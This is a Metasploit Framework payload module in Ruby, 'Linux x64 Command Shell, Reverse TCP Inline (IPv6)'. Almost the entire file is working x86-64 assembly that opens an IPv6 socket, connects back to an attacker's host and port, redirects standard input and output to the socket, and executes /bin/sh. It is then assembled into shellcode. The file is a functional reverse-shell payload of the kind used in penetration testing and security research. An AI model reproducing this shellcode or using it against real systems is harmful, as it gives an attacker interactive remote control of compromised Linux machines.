##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 90

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'epi <epibar052[at]gmail.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      ))
      register_options([
         OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
      ])
  end

  def convert_input(value, padding, reverse=false)
      # converts value to comma separated string of
      # zero-padded bytes to be used in the db instruction
      arr = value.to_s(16).rjust(padding, "0").scan(/../)

      if reverse
        arr = arr.reverse
      end

      arr.map{ |x| sprintf("0x%02x", x.hex) }.join(',')
  end

  def generate_stage
      # 22 -> "0x00,0x16"
      # 4444 -> "0x11,0x5c"
      tcp_port = convert_input(datastore['LPORT'], 4)

      # 0 -> "0x00,0x00,0x00,0x00"
      scope_id = convert_input(datastore['SCOPEID'], 8, true)

      # ::1 -> "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01"
      # dead:beef:2::1009 -> "0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09"
      ipv6_addr = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET6).to_i, 32)

      payload = <<-EOS
        socket_call:
            ; int socket(int domain, int type, int protocol)

            push   0x29
            pop    rax                          ; socket syscall
            push   0xa
            pop    rdi                          ; AF_INET6
            push   0x1
            pop    rsi                          ; SOCK_STREAM
            xor    edx,edx                      ; auto-select protocol 
            syscall

            push   rax
            pop    rdi                          ; store socket fd 
            jmp get_address                     ; jmp-call-pop

        populate_sockaddr_in6:
            ; struct sockaddr_in6 {
            ;     sa_family_t     sin6_family;   /* AF_INET6 */
            ;     in_port_t       sin6_port;     /* port number */
            ;     uint32_t        sin6_flowinfo; /* IPv6 flow information */
            ;     struct in6_addr sin6_addr;     /* IPv6 address */
            ;     uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
            ; };

            ; struct in6_addr {
            ;     unsigned char   s6_addr[16];   /* IPv6 address */
            ; };

            pop rsi                             ; store pointer to struct

        connect_call:
            ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
            ; rdi -> already contains server socket fd
            ; rsi -> already contains pointer to sockaddr_in6 struct 
            push   0x2a
            pop    rax                          ; connect syscall 
            push   0x1c
            pop    rdx                          ; length of sockaddr_in6 (28)
            syscall

        dup2_calls:
            ; int dup2(int oldfd, int newfd);
            ; rdi -> already contains server socket fd
            push   0x3
            pop    rsi                          ; newfd 

        dup2_loop:
            ; 2 -> 1 -> 0 (3 iterations)
            push   0x21
            pop    rax                          ; dup2 syscall
            dec esi
            syscall
            loopnz   dup2_loop

        exec_call:
            ; int execve(const char *filename, char *const argv[], char *const envp[]);
            push 0x3b
            pop rax                             ; execve call
            cdq                                 ; zero-out rdx via sign-extension
            mov rbx, '/bin/sh'
            push rbx
            push rsp
            pop rdi                             ; address of /bin/sh
            syscall

        get_address:
            call populate_sockaddr_in6
            ; sin6_family(2), sin6_port(2), sin6_flowinfo(4), sockaddr_in6(16), sin6_scope_id(4)
            db 0x0a,0x00,#{tcp_port},0x00,0x00,0x00,0x00,#{ipv6_addr},#{scope_id}
      EOS

      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
  end
end
